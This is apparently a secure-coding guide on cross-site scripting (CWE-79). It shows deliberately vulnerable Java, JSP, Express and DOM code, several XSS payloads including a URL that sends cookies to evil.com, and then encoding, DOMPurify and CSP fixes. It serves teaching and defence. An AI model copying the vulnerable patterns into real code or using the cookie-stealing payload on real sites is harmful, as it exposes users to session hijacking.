Why Is This an Issue?

CWE-79 covers Cross-Site Scripting (XSS) — a class of vulnerabilities where user-controlled input is rendered into a web page without proper sanitization or encoding, allowing an attacker to inject <script> tags, event handlers, or other executable markup. SAST tools may report this under various names such as "JavaScript Enabled", "XSS", or "Improper Neutralization of Input During Web Page Generation".

XSS is consistently one of the most prevalent and dangerous web vulnerabilities. It enables:

  • Session hijacking — stealing cookies and session tokens via document.cookie
  • Credential theft — injecting fake login forms or keyloggers
  • Account takeover — performing actions as the victim user
  • Malware distribution — redirecting users to malicious sites
  • Data exfiltration — reading page content and sending it to attacker-controlled servers

There are three main types of XSS:

Reflected XSS

Malicious input is immediately reflected back in the HTTP response (e.g., search queries, error messages). Requires the victim to click a crafted link.

Stored XSS

Malicious input is persisted (database, file) and served to all users who view the content. Most dangerous — no victim interaction needed beyond viewing the page.

DOM-based XSS

Payload never reaches the server — client-side JavaScript reads from a source (URL, postMessage) and writes to a dangerous sink (innerHTML, eval).

This weakness is part of OWASP A03:2021 — Injection and appears in the SANS/CWE Top 25. The primary defense is context-aware output encoding — HTML-encoding for HTML body, JavaScript-encoding for script contexts, URL-encoding for href attributes — combined with Content Security Policy (CSP) as a defense-in-depth layer.

Examples of the Issue

Dangerous: Reflected XSS via unescaped request parameters (Java / JSP / Servlet)

Directly embedding request.getParameter() into HTML output without encoding is the classic reflected XSS pattern. An attacker crafts a URL like ?query=<script>document.location='https://evil.com/?c='+document.cookie</script> and tricks the victim into clicking it. The server echoes the script back, and the browser executes it in the context of the vulnerable application.

// DANGEROUS: User input rendered directly into HTML — reflected XSS. // --- JSP (search results page) --- <h2>Search results for: <%= request.getParameter("query") %></h2> <!-- Attacker input: <script>steal(document.cookie)</script> --> // --- Servlet --- @WebServlet("/search") public class SearchServlet extends HttpServlet { protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException { String query = req.getParameter("query"); resp.setContentType("text/html"); PrintWriter out = resp.getWriter(); // User input injected directly into HTML — no encoding. out.println("<h2>Results for: " + query + "</h2>"); // ↑ XSS sink } } // --- Thymeleaf (th:utext disables encoding) --- <p th:utext="${userComment}"></p> <!-- th:utext = "unescaped text" — renders raw HTML including scripts -->

Dangerous: Stored XSS and Reflected XSS in Express / Node.js

Using res.send() to render user input directly into HTML, or using template engines with unescaped output ({{{}}} in Handlebars, <%- %> in EJS), allows stored and reflected XSS. Stored XSS is especially dangerous — the payload is saved to the database and served to every user who views the page.

// DANGEROUS: User input interpolated directly into HTML response. const express = require('express'); const app = express(); // Reflected XSS — query param rendered without encoding. app.get('/search', (req, res) => { const query = req.query.q; // Direct string interpolation into HTML = XSS. res.send(`<h1>Results for: ${query}</h1>`); }); // Stored XSS — user comment saved to DB, rendered to all visitors. app.get('/post/:id', async (req, res) => { const post = await db.getPost(req.params.id); const comments = await db.getComments(req.params.id); let html = `<h1>${post.title}</h1>`; comments.forEach(c => { // Attacker's comment: <img src=x onerror="steal(document.cookie)"> html += `<div class="comment">${c.body}</div>`; }); res.send(html); }); // EJS template with unescaped output: // <%= userInput %> ← SAFE (auto-encodes) // <%- userInput %> ← DANGEROUS (raw HTML) // Handlebars with unescaped output: // {{userInput}} ← SAFE (auto-encodes) // {{{userInput}}} ← DANGEROUS (raw HTML)

Dangerous: DOM-based XSS via innerHTML, eval, and document.write (Client-Side JavaScript)

DOM-based XSS happens entirely in the browser — the server never sees the payload. Client-side JavaScript reads from a source (URL hash, query params, postMessage, localStorage) and writes to a dangerous sink (innerHTML, eval(), document.write()). SAST tools flag these source-to-sink flows as DOM-based XSS.

// DANGEROUS: DOM-based XSS — payload from URL rendered via innerHTML. // Source: URL hash → Sink: innerHTML const section = window.location.hash.substring(1); document.getElementById('content').innerHTML = section; // URL: page.html#<img src=x onerror=alert(document.cookie)> // Source: URL query param → Sink: innerHTML const params = new URLSearchParams(window.location.search); document.getElementById('greeting').innerHTML = 'Welcome, ' + params.get('name'); // URL: page.html?name=<script>steal()</script> // Source: postMessage → Sink: innerHTML (no origin check) window.addEventListener('message', (event) => { // No origin validation — any window can send malicious HTML. document.getElementById('widget').innerHTML = event.data; }); // Other dangerous sinks: eval(userInput); // Code execution document.write(userInput); // HTML injection element.setAttribute('onclick', userInput); // Event handler injection element.insertAdjacentHTML('beforeend', userInput); // HTML injection new Function(userInput)(); // Code execution setTimeout(userInput, 0); // Code execution (string form)

How to Resolve

Fix (Java): Context-aware output encoding with OWASP Java Encoder

Use the OWASP Java Encoder library for context-aware encoding. The correct encoder depends on where the data appears in the HTML: forHtml() for body text, forHtmlAttribute() for attributes, forJavaScript() for inline scripts, and forUriComponent() for URLs. In Thymeleaf, always use th:text instead of th:utext.

// SAFE: Context-aware encoding prevents XSS in all output contexts. // Add dependency: org.owasp.encoder:encoder:1.3.1 import org.owasp.encoder.Encode; // --- Servlet: HTML body context --- String query = req.getParameter("query"); out.println("<h2>Results for: " + Encode.forHtml(query) + "</h2>"); // <script> becomes &lt;script&gt; — rendered as text, not code. // --- HTML attribute context --- out.println("<input value=\"" + Encode.forHtmlAttribute(query) + "\">"); // --- JavaScript string context --- out.println("<script>var q = '" + Encode.forJavaScript(query) + "';</script>"); // --- URL parameter context --- out.println("<a href=\"/search?q=" + Encode.forUriComponent(query) + "\">"); // --- JSP: use JSTL c:out or fn:escapeXml --- // SAFE: <c:out value="${param.query}" /> // SAFE: ${fn:escapeXml(param.query)} // DANGEROUS: ${param.query} ← No encoding! // --- Thymeleaf: always use th:text (encodes), never th:utext (raw) --- // SAFE: <p th:text="${userComment}"></p> // DANGEROUS: <p th:utext="${userComment}"></p>

Fix (JS): Auto-encoding templates, DOMPurify for rich content, textContent for DOM

Use template engines with auto-encoding enabled by default (<%= %> in EJS, {{}} in Handlebars). When you must render user-supplied HTML (e.g., rich text editors), sanitize it with DOMPurify on the server side. For client-side DOM manipulation, use textContent instead of innerHTML.

// SAFE: Multiple defense layers for Node.js / Express. const express = require('express'); const createDOMPurify = require('dompurify'); const { JSDOM } = require('jsdom'); const DOMPurify = createDOMPurify(new JSDOM('').window); const app = express(); app.set('view engine', 'ejs'); // 1. Use auto-encoding template tags. // EJS: <%= userInput %> auto-encodes HTML entities. app.get('/search', (req, res) => { res.render('search', { query: req.query.q }); // In search.ejs: <h1>Results for: <%= query %></h1> // ↑ Auto-encoded — XSS blocked. }); // 2. When raw HTML is needed (rich text), sanitize with DOMPurify. app.post('/comment', async (req, res) => { const safeHtml = DOMPurify.sanitize(req.body.comment, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'], ALLOWED_ATTR: ['href'] }); // Strips <script>, onerror, onclick, etc. — only safe tags remain. await db.saveComment(req.params.id, safeHtml); res.redirect('back'); }); // 3. Client-side: use textContent, NEVER innerHTML for user data. // SAFE: document.getElementById('name').textContent = userName; // DANGEROUS: // document.getElementById('name').innerHTML = userName;

Defense-in-Depth: Content Security Policy (CSP) and framework protections

Output encoding is the primary defense, but Content-Security-Policy (CSP) provides a critical second layer. A strict CSP blocks inline script execution even if encoding is missed. Modern frameworks (React, Angular, Vue) auto-encode by default — but they all have escape hatches (dangerouslySetInnerHTML, [innerHTML], v-html) that must be audited.

// SAFE: Strict CSP + Helmet middleware (Express/Node.js). const helmet = require('helmet'); app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"], // No 'unsafe-inline'! styleSrc: ["'self'", "'unsafe-inline'"], imgSrc: ["'self'", "data:", "https:"], connectSrc: ["'self'"], // Blocks: inline <script>, eval(), javascript: URIs. } })); // Java (Spring Security) — strict CSP header: // http.headers(h -> h.contentSecurityPolicy(csp -> // csp.policyDirectives("default-src 'self'; script-src 'self'") // )); // ─── Framework escape hatches to audit ─── // React: dangerouslySetInnerHTML={{__html: userInput}} ← AUDIT // Angular: [innerHTML]="userInput" ← AUDIT (auto-sanitized) // Vue: v-html="userInput" ← AUDIT (not sanitized!) // React safe pattern (default behavior): // const SearchResult = ({ query }) => ( // <h1>Results for: {query}</h1> // Auto-encoded by JSX // ); // Additional headers for defense-in-depth: // X-Content-Type-Options: nosniff — prevents MIME sniffing // X-Frame-Options: DENY — prevents clickjacking // Referrer-Policy: strict-origin — limits referrer leakage
